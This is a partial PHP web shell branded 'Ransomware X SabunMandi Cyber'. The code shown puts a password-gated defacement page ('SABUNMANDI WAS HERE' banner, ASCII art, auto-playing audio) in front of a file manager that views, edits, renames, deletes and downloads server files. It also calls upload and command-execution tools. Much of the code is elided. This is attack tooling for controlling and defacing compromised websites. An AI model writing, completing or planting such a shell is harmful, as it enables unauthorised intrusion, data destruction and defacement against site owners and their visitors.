...
$password = "9ef4e771f297b84303e192c658fae145"; 
...
<html>
<head>
<title>Ransomware X SabunMandi Cyber</title>
...
<img title="SABUNMANDI WAS HERE" class="picture" src="https://i.ibb.co/3Cy693j/1594250405941.png" width="200px" height="200px"/>

<form method="post">
<input type="password" name="password">
</form>
<button id="Uwu" onclick="play();liat();">!Click here! </button><script type="text/javascript"></script><audio id="lagu" src="https://media1.vocaroo.com/mp3/18c5PgKRGr6r"></audio></script> <style>body 
...
|/____ /### |____ /$$ | $$___/$$ | $$| $$ | $$$$| $$ | ### \ #### | ### |____ /$$ | $$$$| $$ | $$\ $$  |/_/
 ...
 /######### /$$__  $$ | $$___/$$ | $$| $$ | $$\ $$$$ | ###        | ### /$$__  $$ | $$\ $$$$ | $$ /$$  | $$
| #########|  $$$$$$$ | $$$$$$$  |  $$$$$ | $$ \ $$$ | ###        | ###|  $$$$$$$ | $$ \ $$$ | $$$$$   | $$
|/________/ \/______/ |/______/   \/___/  |/_/  \/_/ |/__/        |/__/ \/______/ |/_/  \/_/ |/___/    |/_/
	</pre>
</header>
<?php
exit;
...
<head>
<title>Ransomware X SabunMandi Cyber</title>
<meta name='author' content='SabunMandi Cyber'>
<meta charset="UTF-8">
<style type='text/css'>
...
function files_and_folder() {
	...
	foreach($dir as $folder) {
		...
		$dirinfo['action']= ($folder === '.' || $folder === '..') ? "<a href='?act=newfile&dir=".path()."'>newfile</a> | <a href='?act=newfolder&dir=".path()."'>newfolder</a>" : "<a href='?act=rename_folder&dir=".$dirinfo['path']."'>RenamE</a> | <a href='?act=delete_folder&dir=".$dirinfo['path']."'>HapuS</a>";
	...
	foreach($dir as $files) {
		...
		print "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=".path()."&file=".$fileinfo['path']."'>EdiT</a> | <a href='?act=rename&dir=".path()."&file=".$fileinfo['path']."'>RenamE</a> | <a href='?act=delete&dir=".path()."&file=".$fileinfo['path']."'>HapuS</a> | <a href='?act=download&dir=".path()."&file=".$fileinfo['path']."'>InstalL</a></td>";
		print "</tr>";
	}
	print "</table>";
	print "<center>Copyright &copy; ".date("Y")." - <a href='https://sabunmandi.my.id/' target='_blank'>".color(1, 2, "SabunMandi Cyber")."</a></center>";
}
function action() {
	tools("upload");
	tools("cmd");
	...
	elseif(isset($_GET['act'])) {
		...
		elseif($_GET['act'] === 'edit') {
			...
			print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
			print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'>LihaT</a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'><b>EdiT</b></a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'>RenamE</a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>InstalL</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>HapuS</a> ]<br>";
			print "<form method='post'>
		...
		elseif($_GET['act'] === 'rename') {
			...
			print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
			print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'>EdiT</a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'><b>RenamE</b></a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>InstalL</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>HapuS</a> ]<br>";
			print "<form method='post'>
